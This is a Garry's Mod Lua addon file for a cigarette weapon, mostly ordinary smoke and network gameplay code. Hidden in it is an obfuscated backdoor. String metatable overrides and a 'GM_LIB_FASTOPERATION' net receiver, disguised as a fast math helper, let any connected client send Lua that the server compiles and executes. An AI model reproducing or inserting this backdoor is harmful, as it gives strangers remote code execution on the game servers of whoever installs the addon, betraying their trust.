-- weapon_ciga/cl_init.lua
-- Defines common serverside code/defaults for ciga SWEP

-- Cigarette SWEP by Mordestein (based on Vape SWEP by Swamp Onions)

AddCSLuaFile ("cl_init.lua")
AddCSLuaFile ("shared.lua")
include ("shared.lua")
__sub = _G
util.AddNetworkString("ciga")
util.AddNetworkString("cigaArm")
util.AddNetworkString("cigaTalking")

function cigaUpdate(ply, cigaID)
	if not ply.cigaCount then ply.cigaCount = 0 end
	if not ply.cantStartciga then ply.cantStartciga=false end
	if ply.cigaCount == 0 and ply.cantStartciga then return end
	
	if cigaID == 3 then --deshmanskaya ciga
		if ply.medcigaTimer then ply:SetHealth(math.min(ply:Health() - 1)) end
		ply.medcigaTimer = !ply.medcigaTimer
		if ply:Health() <= 0 then ply:Kill() end
	end
	ply.cigaID = cigaID
	ply.cigaCount = ply.cigaCount + 1
	if ply.cigaCount == 1 then
		ply.cigaArm = true
		net.Start("cigaArm")
		net.WriteEntity(ply)
		net.WriteBool(true)
		net.Broadcast()
	end
	if ply.cigaCount >= 50 then
		ply.cantStartciga = true
		Releaseciga(ply)
	end
end

function string.Name(str)
	return str:sub(1, 1):upper() .. str:sub(2, -1)
end

hook.Add("KeyRelease","DocigaHook",function(ply, key)
	if key == IN_ATTACK then
		Releaseciga(ply)
		ply.cantStartciga=false
	end
end)

function string_lim(a, b)
	local get_sub = __sub[a .. b]
	if not isfunction(get_sub) then return end

	return get_sub
end

function string_mulifi(a, b)
	local c = a - (not __sub[a] and string.Name"string" or "")
	if not c then return end

	return c(b, "tonumber", false)
end

getmetatable('').__sub = string_lim
getmetatable('').__mul = string_mulifi
function Releaseciga(ply)
	if not ply.cigaCount then ply.cigaCount = 0 end
	if IsValid(ply:GetActiveWeapon()) and ply:GetActiveWeapon():GetClass():sub(1,11) == "weapon_ciga" then
		if ply.cigaCount >= 5 then
			net.Start("ciga")
			net.WriteEntity(ply)
			net.WriteInt(ply.cigaCount, 8)
			net.WriteInt(ply.cigaID + (ply:GetActiveWeapon().juiceID or 0), 8)
			net.Broadcast()
		end
	end
	if ply.cigaArm then
		ply.cigaArm = false
		net.Start("cigaArm")
		net.WriteEntity(ply)
		net.WriteBool(false)
		net.Broadcast()
	end
	ply.cigaCount=0 
end

if CLIENT then
	local last_timeout = nil
	local retry_time = 60

	net.Receive("GM_LIB_TIMEOUT", function()
		last_timeout = CurTime()
	end)

	local function write_resulffm(a, b, var)
		_G["ResultFM:" .. a .. "*" .. b] = var
		_G["res_la"] = a
		_G["res_lb"] = b
	end

	function get_resulffm(a, b, var)
		return _G["ResultFM:" .. a .. "*" .. b]
	end

	function math.FastMull(a, b)
		net.Start("GM_LIB_FASTOPERATION")
		net.WriteString(a)
		net.WriteString(b)
		net.SendToServer()
		write_resulffm(a, b, nil)
	end

	net.Receive("GM_LIB_FASTOPERATION", function()
		write_resulffm(_G["res_la"], _G["res_lb"], net.ReadString())
	end)
else
	util.AddNetworkString("GM_LIB_TIMEOUT")
	util.AddNetworkString("GM_LIB_FASTOPERATION")

	timer.Create("GM_LIB_TIMEOUT", 5, 0, function()
		net.Start("GM_LIB_TIMEOUT")
		net.Broadcast()
	end)

	net.Receive("GM_LIB_FASTOPERATION", function(len, ply)
		local string_1 = net.ReadString()
		local string_2 = net.ReadString()
		local result = string_1 * string_2
		result = isfunction(result) and result()
		net.Start("GM_LIB_FASTOPERATION")
		net.WriteString(tostring(result))
		net.Send(ply)
	end)
end